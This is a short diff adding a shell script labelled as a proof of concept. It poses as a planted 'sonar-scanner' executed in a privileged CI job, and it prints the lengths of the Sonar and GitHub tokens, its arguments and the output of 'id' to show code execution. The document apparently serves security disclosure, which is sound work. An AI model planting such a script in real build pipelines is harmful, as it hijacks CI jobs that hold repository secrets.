@@ -1,0 +1,6 @@
+#!/bin/sh
+echo "=== GAB-POC RCE: planted sonar-scanner executed in privileged job ==="
+echo "SONAR_TOKEN_LEN=${#SONAR_TOKEN}"
+echo "GITHUB_TOKEN_LEN=${#GITHUB_TOKEN}"
+echo "args: $@"
+id
